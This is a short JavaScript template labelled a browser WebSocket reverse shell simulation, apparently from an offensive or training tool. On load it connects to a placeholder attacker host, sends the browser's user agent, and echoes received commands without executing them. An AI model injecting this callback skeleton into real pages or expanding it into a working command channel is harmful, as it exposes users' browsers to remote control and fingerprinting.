// Browser WebSocket Reverse Shell Simulation
(function(){
    var ws = new WebSocket("ws://{{ ip }}:{{ port }}");
    ws.onopen = function() {
        ws.send("Connected: " + navigator.userAgent);
    };
    ws.onmessage = function(evt) {
        // Simulate shell execution
        var cmd = evt.data;
        ws.send("Executed: " + cmd);
    };
})();
